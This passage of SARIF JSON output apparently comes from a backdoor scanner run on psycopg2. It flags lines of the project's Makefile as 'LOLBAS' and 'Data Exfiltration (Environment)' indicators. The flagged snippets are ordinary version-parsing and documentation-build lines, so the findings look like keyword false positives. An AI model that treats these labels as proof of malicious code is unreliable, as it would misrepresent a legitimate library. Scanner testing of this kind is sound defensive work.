            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/Makefile"
                },
                "region": {
                  "startLine": 42,
                  "startColumn": 60,
                  "endLine": 42,
                  "endColumn": 65,
                  "snippet": {
                    "text": "\tBUILD_EXT_OPT += --pg-config=$(PG_CONFIG)\nendif\n\nVERSION := $(shell grep PSYCOPG_VERSION setup.py | head -1 | sed -e \"s/.*'\\(.*\\)'/\\1/\")\nSDIST := dist/psycopg2-$(VERSION).tar.gz\n\n.PHONY: check clean\n",
                    "rendered": {
                      "text": "\tBUILD_EXT_OPT += --pg-config=$(PG_CONFIG)\nendif\n\nVERSION := $(shell grep PSYCOPG_VERSION setup.py | head -1 | sed -e \"s/.*'\\(.*\\)'/\\1/\")\nSDIST := dist/psycopg2-$(VERSION).tar.gz\n\n.PHONY: check clean\n",
                      "markdown": "`\tBUILD_EXT_OPT += --pg-config=$(PG_CONFIG)\nendif\n\nVERSION := $(shell grep PSYCOPG_VERSION setup.py | head -1 | sed -e \"s/.*'\\(.*\\)'/\\1/\")\nSDIST := dist/psycopg2-$(VERSION).tar.gz\n\n.PHONY: check clean\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/Makefile"
                },
                "region": {
                  "startLine": 42,
                  "startColumn": 50,
                  "endLine": 42,
                  "endColumn": 56,
                  "snippet": {
                    "text": "\tBUILD_EXT_OPT += --pg-config=$(PG_CONFIG)\nendif\n\nVERSION := $(shell grep PSYCOPG_VERSION setup.py | head -1 | sed -e \"s/.*'\\(.*\\)'/\\1/\")\nSDIST := dist/psycopg2-$(VERSION).tar.gz\n\n.PHONY: check clean\n",
                    "rendered": {
                      "text": "\tBUILD_EXT_OPT += --pg-config=$(PG_CONFIG)\nendif\n\nVERSION := $(shell grep PSYCOPG_VERSION setup.py | head -1 | sed -e \"s/.*'\\(.*\\)'/\\1/\")\nSDIST := dist/psycopg2-$(VERSION).tar.gz\n\n.PHONY: check clean\n",
                      "markdown": "`\tBUILD_EXT_OPT += --pg-config=$(PG_CONFIG)\nendif\n\nVERSION := $(shell grep PSYCOPG_VERSION setup.py | head -1 | sed -e \"s/.*'\\(.*\\)'/\\1/\")\nSDIST := dist/psycopg2-$(VERSION).tar.gz\n\n.PHONY: check clean\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/Makefile"
                },
                "region": {
                  "startLine": 42,
                  "startColumn": 18,
                  "endLine": 42,
                  "endColumn": 24,
                  "snippet": {
                    "text": "\tBUILD_EXT_OPT += --pg-config=$(PG_CONFIG)\nendif\n\nVERSION := $(shell grep PSYCOPG_VERSION setup.py | head -1 | sed -e \"s/.*'\\(.*\\)'/\\1/\")\nSDIST := dist/psycopg2-$(VERSION).tar.gz\n\n.PHONY: check clean\n",
                    "rendered": {
                      "text": "\tBUILD_EXT_OPT += --pg-config=$(PG_CONFIG)\nendif\n\nVERSION := $(shell grep PSYCOPG_VERSION setup.py | head -1 | sed -e \"s/.*'\\(.*\\)'/\\1/\")\nSDIST := dist/psycopg2-$(VERSION).tar.gz\n\n.PHONY: check clean\n",
                      "markdown": "`\tBUILD_EXT_OPT += --pg-config=$(PG_CONFIG)\nendif\n\nVERSION := $(shell grep PSYCOPG_VERSION setup.py | head -1 | sed -e \"s/.*'\\(.*\\)'/\\1/\")\nSDIST := dist/psycopg2-$(VERSION).tar.gz\n\n.PHONY: check clean\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/Makefile"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 8,
                  "endLine": 9,
                  "endColumn": 13,
                  "snippet": {
                    "text": "#\n# Build the documentation::\n#\n#   make env (once)\n#   make docs\n#\n# Create a source package::\n",
                    "rendered": {
                      "text": "#\n# Build the documentation::\n#\n#   make env (once)\n#   make docs\n#\n# Create a source package::\n",
                      "markdown": "`#\n# Build the documentation::\n#\n#   make env (once)\n#   make docs\n#\n# Create a source package::\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/Makefile"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 9,
                  "endLine": 9,
                  "endColumn": 17,
                  "snippet": {
                    "text": "#\n# Build the documentation::\n#\n#   make env (once)\n#   make docs\n#\n# Create a source package::\n",
                    "rendered": {
                      "text": "#\n# Build the documentation::\n#\n#   make env (once)\n#   make docs\n#\n# Create a source package::\n",
                      "markdown": "`#\n# Build the documentation::\n#\n#   make env (once)\n#   make docs\n#\n# Create a source package::\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        }
      ],
      "columnKind": "utf16CodeUnits"
    }
  ]
}